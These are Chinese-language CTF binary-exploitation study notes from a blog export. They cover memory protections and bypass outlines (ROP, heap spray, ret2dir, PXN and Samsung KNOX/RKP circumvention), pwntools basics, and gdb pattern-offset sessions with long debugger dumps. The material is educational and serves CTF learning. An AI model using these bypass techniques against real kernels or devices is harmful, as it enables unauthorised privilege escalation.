https://blog.csdn.net/aptx4869_li/article/details/78877216","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"Writeup","slug":"Writeup","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Writeup/"},{"name":"Revese","slug":"Revese","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Revese/"},{"name":"IDA","slug":"IDA","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/IDA/"},{"name":"shell","slug":"shell","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/shell/"},{"name":"canary","slug":"canary","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/canary/"}]},{"title":"阶段总结","slug":"阶段总结","date":"2019-01-13T23:34:27.000Z","updated":"2019-01-13T23:38:44.717Z","comments":true,"path":"2019/01/14/阶段总结/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/阶段总结/","excerpt":"","text":"稍稍总结一下这是搭建好博客之后，上传了一些自己很久之前的笔记，和自己最近在做的有点断层，慢慢再补充吧，其他的资料有一点零散，等发现在哪里了再上传补充吧","categories":[],"tags":[]},{"title":"PWN 学习笔记","slug":"PWN-学习笔记","date":"2019-01-13T22:42:26.000Z","updated":"2019-01-14T02:23:35.649Z","comments":true,"path":"2019/01/14/PWN-学习笔记/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/PWN-学习笔记/","excerpt":"","text":"PWN 学习笔记原理知识： 基础篇(栈的原理)： https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/1234https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/http://www.cnblogs.com/clover-toeic/p/3755401.htmlhttp://www.mamicode.com/info-detail-1990426.htmlhttps://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic/ file 命令： 用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程 12root@kali:~/Desktop# file what_the_fuckwhat_the_fuck: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f5874ff98d454f054743d010a0456a89f09aa535, stripped checksec命令： 该脚本来查询该文件使用了哪些防护技术 1234567root@kali:~/Desktop# checksec what_the_fuck[*] &apos;/root/Desktop/what_the_fuck&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 数据保护机制： NX 类似于(windows上的DEP) 123在AMD64位CPU上，在页面表（page table）中的页面信息加了一个特殊的位，NX位（No eXecute）。如果NX位为0，这个页面上可以执行指令。如果NX位为1，这个页面上不允许执行指令。如果试图执行指令的话，就会产生异常。 Stack Canary 123在缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击 PIE 地址空间分布随机化 ALSR 123456789内存地址随机化机制（address space layout randomization)，有以下三种情况0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 RELRO 符号重定向表格 1设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 linux保护机制整理DEP，ASLR，更强的Selinux，内核代码段只读，PXN DEP，ASLR，Selinux等技术在PC时代就已经比较成熟了。内核代码段只读也是可以通过修改ptmx_fops指针表等方案来绕过 DEP（windows）、NX（linux）堆栈代码执行保护 绕过方法： 12使用 （ROP）Return-Oriented Programming.绕过 (如ret2data、ret2libc、ret2strcpy、ret2gets、ret2syscall)gadget:virtualprotect、jmp esp、mona.py ASLR 地址随机化 绕过方法： 123451、直接RET替换（一般进程也会加载没有随机化的模块，可以找到JMP ESP指令的跳板直接调用）2、替换EIP一部分（找到没有随机化的模块然后使用利息泄漏确定EIP的位置，再算出模块的基地址，最后算出要跳的函数地址）3、NOP喷射（DEP没开的情况下，创建一大块NOP+shellcode，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。 统slide code（滑板指令）一般是NOP指令，譬如0x0C（0x0C0C代表的x86指令是OR AL 0x0C），0x0D等等，不影响程序的执行的。）4、暴力（如果漏洞不会造成程序崩溃，可以暴力测试256种模块基地址来测试，只到有满足的）最LOW Self-Protection Project(KSPP) 内核代码段和常量数据只读保护 1234567mark_rodata_ro写保护的实现是通过set_memory_ro函数内部调用实现set_page_attributes来实现的。攻击方法：针对这种页保护的防御，较常用的方法是,从物理页表中取相应的页表条目，找到页表描述符，修改相应的权限。我们可以通过利用内核中现成的代码来完成 页表属性的修改。我们发现可以通过内核导出函数set_memory_rw来打开内核页表的读写权限。set_memory_rw函数的定义如下：int set_memory_rw(unsigned long virt, int numpages) PXN( PrivilegedExecute-Never ) “特权执行从不” PXN的绕过方法： 123456789101112利用ROP技术绕过PXNROP主要原理是通过控制内存中的一段数据，通过控制数据来控制代码执行流，如组合执行内核中特定的代码片段，从而达到修改内核中的关键数据，达到提权限的目的。这种攻击方式是需要进行不同机型中查找到多段代码片段，如果需要root的机型较多，则需要攻击者投入较多精力去做适配。利用RET2DIR技术利用原理是，Linux内核在设计的时候，在用户空间映射内存的时候，为了提高内存的操作效率，内核也相应地在内核的低端内存区地址映射一段影子内存。者利用该缺陷，将用户空间的攻击代码映射到内核的低端内存可执行区或者将特定数据进行喷射到内核的低端内存，进行内存布局，然后利用发现的漏洞，让内核执行攻击代码，从而达到提权的作用。这项技术在32位arm设备上有65%以上的成功率，而在64位arm中有96%的成功率。与ROP不同，RET2DIR这项技术不需要对内核代码进行重利用和组合，就可以直接将攻击代码或数据映射到内核的低端内存。由于64位ARM内核的设备都已经开启了PXN防护，这项技术成为通用root工具绕过64位ARM内核的PXN必备技术。在KingRoot的cve-2015-3636和cve-2016-1805漏洞利用中都使用到了该技术绕过PXN防护。通过内核特定函数完成PXN绕过。该技术在2016年MOSEC大会上由360团队公开，该技术巧妙地利用kernel_setsockopt函数的特性，通过控制r0, 让内核执行set_fs(KERNEL_DS),实现任意地址读写权限的效果。 KNOX绕过 1234三星KNOX里对内核保护主要由TIMA完成。TIMA 使用 ARM TrustZone硬件，持续的监控linux内核的完整性。Linux内核采用的CRC完整性认证机制不同，TIMA采用了数字证书签名技术对加载的内核模块进行合法性验证，以确保每个加载的模块都是合法的。在2014年SyScan360大会上360团队的陈章琪和申迪介绍了TIMA LKM验证机制的绕过方法。他们的思路是通过Patch内核的代码，绕过TIMA验证。具体的攻击方法如下： 123456789101112131415161718192021222324if(memcmp(hdr-&gt;e_ident, ELFMAG, SELFMAG) != 0 || hdr-&gt;e_type != ET_REL || elf_check_arch(hdr) || hdr-&gt;e_shentsize != sizeof(Elf_shdr))&#123; err = -ENOEXEC; goto free_hdr;&#125;if(len &lt; hdr-&gt;e_snoff + hdr-&gt;e_shnum * sizeof(Elf_shdr))&#123; err = -ENOEXEC; goto free_hdr;&#125;#ifdef TIMA_LKM_AUTH_ENABLED if(lkmauth_bootmode != BOOTMODE_RECOVERY &amp;&amp; lkmauth(hdr, len) != RET_LKMAUTH_SUSSESS)&#123; pr_err (\"TIMA:lkmauth--unable to load kernel module;module len is %1u,\\n\",len); err = -ENOEXEC; goto free_hdr; &#125;#endif info-&gt;hdr = hdr; info-&gt;len = len; return 0; 12345678910111213X2.0，TIMA引入了实时内核保护(RKP)技术。RKP可在TrustZone内对操作系统进行持续不断且富有策略性的实时监控，以防止篡改内核。RKP可对内核内部发生的重要事件进行审计（可在ARM中进行检查）。如果确定某个事件对 OS 内核的完整性具有影响，则 RKP 将会停止该事件，或记录怀疑存在篡改行为的认证结论，并将其发送至 MDM。这可以防止恶意修改和注入内核代码，包括强制内核破坏自身的数据。在2.0版本的RKP除了保护页表之外，还保护一些关键的内核对象（如cred,real_cred）。RKP将存储关键安全信息对象的kmem_cache里所有的页都设为只读，只能在TIMA里面对kmem_cache里的页进行写操作。在MOSEC2016大会上，科恩实验室的方家弘介绍了KingRoot产品中修改这些关键安全数据，实现DKOM的方法。KingRoot的方法是利用cve-2015-1805的任意地址写的漏洞，修改file_operations里的int (*check_flags)(int) 函数指针，使得函数指针指向override_creds函数。通过控制check_flags函数输入参数，使得TIMA主动修改cred的值，从而绕过RKP防护，达到提权的效果。除了防止运行时修改关键的安全数据结构之外，RKP还对一些系统调用进行监控，如execve系统调用。对于任何的ROOT进程，sec_restrict_fork函数将判断是否该进程的路径是来自/data目录，正常情况下，该目录是存放用户程序的唯一路径。三星希望这样可以阻止类似SU这样的程序可以给/DATA/目录下的用户程序赋权限的情况发生。但是，我们可以依然可以修改一些关键数据来绕过sec_restrict_fork函数的判断 分析漏洞 写exp PWNTOOLS的基本使用方法123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythonfrom pwn import *context.binary(./elf) #The recommended method is to use context.binary to automagically set all of the appropriate values.context.arch = 'amd64' #Which sets up everything in the exploit for exploiting a 64-bit Intel binary.context.update(arch='i386', os='linux')&gt;&gt;&gt; context.clear()&gt;&gt;&gt; context.update(os='linux')&gt;&gt;&gt; context.os == 'linux'True&gt;&gt;&gt; context.arch = 'arm'&gt;&gt;&gt; vars(context) == &#123;'arch': 'arm', 'bits': 32, 'endian': 'little', 'os': 'linux'&#125;True&gt;&gt;&gt; context.endian'little'&gt;&gt;&gt; context.bits32&gt;&gt;&gt; def nop():... print pwnlib.asm.asm('nop').encode('hex')&gt;&gt;&gt; nop()00f020e3&gt;&gt;&gt; with context.local(arch = 'i386'):... nop()90&gt;&gt;&gt; from pwnlib.context import Thread as PwnThread&gt;&gt;&gt; from threading import Thread as NormalThread&gt;&gt;&gt; with context.local(arch = 'mips'):... pwnthread = PwnThread(target=nop)... thread = NormalThread(target=nop)&gt;&gt;&gt; # Normal thread uses the default value for arch, 'i386'&gt;&gt;&gt; _=(thread.start(), thread.join())90&gt;&gt;&gt; # Pwnthread uses the correct context from creation-time&gt;&gt;&gt; _=(pwnthread.start(), pwnthread.join())00000000&gt;&gt;&gt; nop()00f020e3 命令 功能 elf = ELF(&quot;./easypwn&quot;) 在本地静态加载可执行文件 mian = elf.symbols[&#39;main&#39;] 获取本地加载的elf文件的某个函数的加载地址 io.process(&#39;./easypwn&#39;) 在本地加载可执行文件 io.recvuntil(&#39;elf_String\\n&#39;) 运行程序后直到接收到字符串（elf_String）之后 io.sendline(&#39;string&#39;) 向进程发送一行数据结尾包含换行符（0x0a） io.send(&#39;string&#39;) 向进程发送数据不包含换行符 p64(data)/p32(data) 将数据打包为64/32位运行环境字节码 u64(data)/u32(data) 将数据解包为64/32位环境字节 log.info(data) 将data显示为运行时调试信息 一些基础知识点x64下前6个参数不是保存在栈中，而是通过寄存器传值 64位汇编 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 参数个数大于 7 个的时候 H(a, b, c, d, e, f, g, h); a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9 h-&gt;8(%esp) g-&gt;(%esp) call H ELF文件加载到内存中的状态 BSS段： BSS段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。 BSS是英文Block Started by Symbol的简称。 BSS段属于静态内存分配。 数据段： 数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。 数据段属于静态内存分配。 代码段： 代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。 这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。 在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。 堆（heap）： 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。 当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减） 栈(stack)： 栈又称堆栈， 是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。 除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。 由于栈的先进先出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。 确定缓冲区大小的peda方法：1234567891011121314151617181920212223242526272829303132333435363738394041gdb-peda$ pattern_create 60'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA'gdb-peda$ runStarting program: /root/Desktop/ret2resolve/babystackProgram received signal SIGALRM, Alarm clock.AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAAProgram received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x3d ('=')EBX: 0x0ECX: 0xffffd190 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA\\n\\271\\336\", &lt;incomplete sequence \\367&gt;)EDX: 0x40 ('@')ESI: 0xf7fa8000 --&gt; 0x1d5d8cEDI: 0x0EBP: 0x41304141 ('AA0A')ESP: 0xffffd1c0 (\"bAA1AAGAAcAA\\n\\271\\336\", &lt;incomplete sequence \\367&gt;)EIP: 0x41414641 ('AFAA')EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414641[------------------------------------stack-------------------------------------]0000| 0xffffd1c0 (\"bAA1AAGAAcAA\\n\\271\\336\", &lt;incomplete sequence \\367&gt;)0004| 0xffffd1c4 (\"AAGAAcAA\\n\\271\\336\", &lt;incomplete sequence \\367&gt;)0008| 0xffffd1c8 (\"AcAA\\n\\271\\336\", &lt;incomplete sequence \\367&gt;)0012| 0xffffd1cc --&gt; 0xf7deb90a (&lt;__libc_start_main+90&gt;: and ebx,0x2)0016| 0xffffd1d0 --&gt; 0xf7fa8000 --&gt; 0x1d5d8c0020| 0xffffd1d4 --&gt; 0xf7fa8000 --&gt; 0x1d5d8c0024| 0xffffd1d8 --&gt; 0x00028| 0xffffd1dc --&gt; 0xf7deb9a1 (&lt;__libc_start_main+241&gt;: add esp,0x10)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414641 in ?? ()gdb-peda$ pattern_offset AFAAAFAA found at offset: 44gdb-peda$ 确定缓冲区大小的gef方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273gef➤ pattern create 200[+] Generating a pattern of 200 bytesaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab[+] Saved as '$_gef0'gef➤ rStarting program: /root/Desktop/PWN/ret2_dl_runtime_resolve/mainWelcome to XDCTF2015~!aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabProgram received signal SIGSEGV, Segmentation fault.[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────────────────────────────────────[ registers ]────$eax : 0xc9$ebx : 0x0$ecx : 0xffffd0ac → \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"$edx : 0x100$esp : 0xffffd120 → \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"$ebp : 0x62616163 (\"caab\"?)$esi : 0xf7fa8000 → 0x001d5d8c$edi : 0xffffd190 → 0xffffd1b0 → 0x00000001$eip : 0x62616164 (\"daab\"?)$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]$gs: 0x0063 $ds: 0x002b $fs: 0x0000 $ss: 0x002b $es: 0x002b $cs: 0x0023────────────────────────────────────────────────────────────────────────────────[ stack ]────0xffffd120│+0x00: \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\" ← $esp0xffffd124│+0x04: \"faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]\"0xffffd128│+0x08: \"gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]\"0xffffd12c│+0x0c: \"haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]\"0xffffd130│+0x10: \"iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]\"0xffffd134│+0x14: \"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\"0xffffd138│+0x18: \"kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]\"0xffffd13c│+0x1c: \"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]\"────────────────────────────────────────────────────────────────────────────[ code:i386 ]────[!] Cannot disassemble from $PC[!] Cannot access memory at address 0x62616164──────────────────────────────────────────────────────────────────────────────[ threads ]────[#0] Id 1, Name: \"main\", stopped, reason: SIGSEGV────────────────────────────────────────────────────────────────────────────────[ trace ]─────────────────────────────────────────────────────────────────────────────────────────────────[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────────────────────────────────────[ registers ]────$eax : 0xc9$ebx : 0x0$ecx : 0xffffd0ac → \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"$edx : 0x100$esp : 0xffffd120 → \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"$ebp : 0x62616163 (\"caab\"?)$esi : 0xf7fa8000 → 0x001d5d8c$edi : 0xffffd190 → 0xffffd1b0 → 0x00000001$eip : 0x62616164 (\"daab\"?)$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]$gs: 0x0063 $ds: 0x002b $fs: 0x0000 $ss: 0x002b $es: 0x002b $cs: 0x0023────────────────────────────────────────────────────────────────────────────────[ stack ]────0xffffd120│+0x00: \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\" ← $esp0xffffd124│+0x04: \"faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]\"0xffffd128│+0x08: \"gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]\"0xffffd12c│+0x0c: \"haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]\"0xffffd130│+0x10: \"iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]\"0xffffd134│+0x14: \"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\"0xffffd138│+0x18: \"kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]\"0xffffd13c│+0x1c: \"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]\"────────────────────────────────────────────────────────────────────────────[ code:i386 ]────[!] Cannot disassemble from $PC[!] Cannot access memory at address 0x62616164──────────────────────────────────────────────────────────────────────────────[ threads ]────[#0] Id 1, Name: \"main\", stopped, reason: SIGSEGV────────────────────────────────────────────────────────────────────────────────[ trace ]─────────────────────────────────────────────────────────────────────────────────────────────────0x62616164 in ?? ()gef➤ pattern search 0x62616164[+] Searching '0x62616164'[+] Found at offset 112 (little-endian search) likely 使gef的调试信息输出到不同的终端窗口1234$ tty #这个命令查看当前打开的终端数量/dev/pts/0 #这个结果表示有一个终端窗口gef➤ gef config context.redirect /dev/pts/0 #命令设置将运行结果输出到0号终端窗口gef➤ gef config context.redirect \"\" #恢复设置 objdump使用相关技巧123456789101112131415objdump -f test 显示test的文件头信息objdump -d test 反汇编test中的需要执行指令的那些sectionobjdump -D test 与-d类似，但反汇编test中的所有sectionobjdump -h test 显示test的Section Header信息objdump -x test 显示test的全部Header信息objdump -s test 除了显示test的全部Header信息，还显示他们对应的十六进制文件代码输出到txt文件objdump -s test.so&gt;test.txt同时可以用命nm,strace,gdb. 常用的查找偏移的办法 strings工具 12root@kali:~/Desktop/PWN/guess# strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep \"environ\" 142be __environ ROPgadget工具 123456789root@kali:~/Desktop/PWN/guess# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"__environ\"Gadgets information============================================================Unique gadgets found: 0root@kali:~/Desktop/PWN/guess# ROPgadget --binary easypwn --only 'pop|ret'...root@kali:~/Desktop/PWN/guess# ROPgadget --binary easypwn --only 'pop|ret' | grep 'ebx'... 目前感觉上面的两种工具都有自己的优点： strings工具更好的锁定libc文件中的字符串的位置，搜索速度更快 ROPgadget工具能够更好的锁定汇编代码的片段提供的信息更加详细，但搜索速度较慢 gef工具与pwndbg调试工具区别 最近刚刚发现的这两个工具的一个不同之处，具体原因解释的可能不对，但这个现象是存在的。 遇到程序fork()或者其他什么能够产生另一个进程的程序的时候，gef不会直接跳转到这个进程去让你调试，如果你所下的断点包含在fork()子进程的代码部分里面，gef会直接执行，并不会在该位置停下，总结一下就是你的这个断点的执行效果不在当前进程的时候gef不能够帮你断下来，他会直接开了子进程，然后执行到该断点处继续执行，切记不会停下来，此时对于父进程而言，是gef正在调试的进程则会处在等待子进程相应返回的状态，待到子进程返回之后，父进程继续执行。换句话说，就是你的断点不在当前进程时，gef不会帮你断下来。如果父进程有wait() 函数等待子进程状态，而你在调试的时候是单步步过的call wait这句命令，那么gef会陷入阻塞状态等待子进程返回，而此时子进程又断了下来（因为单步执行），gef就会一直等这个暂停的进程，使用gdb，attach到该子进程后使其继续执行，父进程的gef等待状态在收到子进程结束的信息后会结束等待状态。 然而pwndbg则会直接帮你跳转到子进程去，在断点的位置停下，并且结束后自动返回父进程进行调试 GDB调试技巧 汇编语言ret后带一个参数的执行方式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980pwndbg&gt; siLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd07c —▸ 0xf7eb8470 (read) ◂— push esi EIP 0xf7fea35b (_dl_runtime_resolve+27) ◂— ret 0xc─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt; 0xf7fea350 &lt;_dl_runtime_resolve+16&gt; pop edx 0xf7fea351 &lt;_dl_runtime_resolve+17&gt; mov ecx, dword ptr [esp] 0xf7fea354 &lt;_dl_runtime_resolve+20&gt; mov dword ptr [esp], eax 0xf7fea357 &lt;_dl_runtime_resolve+23&gt; mov eax, dword ptr [esp + 4] ► 0xf7fea35b &lt;_dl_runtime_resolve+27&gt; ret 0xc ↓ 0xf7eb8470 &lt;read&gt; push esi 0xf7eb8471 &lt;read+1&gt; push ebx 0xf7eb8472 &lt;read+2&gt; sub esp, 0x14 0xf7eb8475 &lt;read+5&gt; mov ebx, dword ptr [esp + 0x20] 0xf7eb8479 &lt;read+9&gt; mov ecx, dword ptr [esp + 0x24]─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd07c —▸ 0xf7eb8470 (read) ◂— push esi01:0004│ 0xffffd080 —▸ 0xffffd0ac ◂— 0x102:0008│ 0xffffd084 —▸ 0xf7ffd940 ◂— 0x003:000c│ 0xffffd088 ◂— 0x804:0010│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1005:0014│ 0xffffd090 ◂— 0x006:0018│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x107:001c│ 0xffffd098 ◂— 0x100───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7eb8470 read f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241__GI___libc_read (fd=0x0, buf=0xffffd0ac, nbytes=0x100) at ../sysdeps/unix/sysv/linux/read.c:2626 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0xf7eb8470 (read) ◂— push esi─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── ► 0xf7eb8470 &lt;read&gt; push esi 0xf7eb8471 &lt;read+1&gt; push ebx 0xf7eb8472 &lt;read+2&gt; sub esp, 0x14 0xf7eb8475 &lt;read+5&gt; mov ebx, dword ptr [esp + 0x20] 0xf7eb8479 &lt;read+9&gt; mov ecx, dword ptr [esp + 0x24] 0xf7eb847d &lt;read+13&gt; mov edx, dword ptr [esp + 0x28] 0xf7eb8481 &lt;read+17&gt; mov eax, dword ptr gs:[0xc] 0xf7eb8487 &lt;read+23&gt; test eax, eax 0xf7eb8489 &lt;read+25&gt; jne read+56 &lt;0xf7eb84a8&gt; ↓ 0xf7eb84a8 &lt;read+56&gt; mov dword ptr [esp + 0xc], edx 0xf7eb84ac &lt;read+60&gt; mov dword ptr [esp + 8], ecx─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* 'GLIBC_2.0' */───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7eb8470 read f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241 上面的内容是一个简单的例子，ret 0xc 的执行效果，首先从栈顶弹出一个值最为返回地址，去相应的位置执行，然后从栈顶弹出偏移0xc的内容，或者理解为 esp - 0xc，此程序为32位系统，则效果为从栈顶弹出三个值pwndbg&gt; b mainpwndbg&gt; siLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd090 ◂— 0x0 EIP 0x8048514 (vuln+41) —▸ 0xfffe87e8 ◂— 0x0─────────────────────────────────────────[ DISASM ]────────────────────────────────────────── 0x8048509 &lt;vuln+30&gt; push 0x100 0x804850e &lt;vuln+35&gt; lea eax, [ebp - 0x6c] 0x8048511 &lt;vuln+38&gt; push eax 0x8048512 &lt;vuln+39&gt; push 0 ► 0x8048514 &lt;vuln+41&gt; call read@plt &lt;0x80483a0&gt; fd: 0x0 buf: 0xffffd0ac ◂— 0x1 nbytes: 0x100 0x8048519 &lt;vuln+46&gt; add esp, 0x10 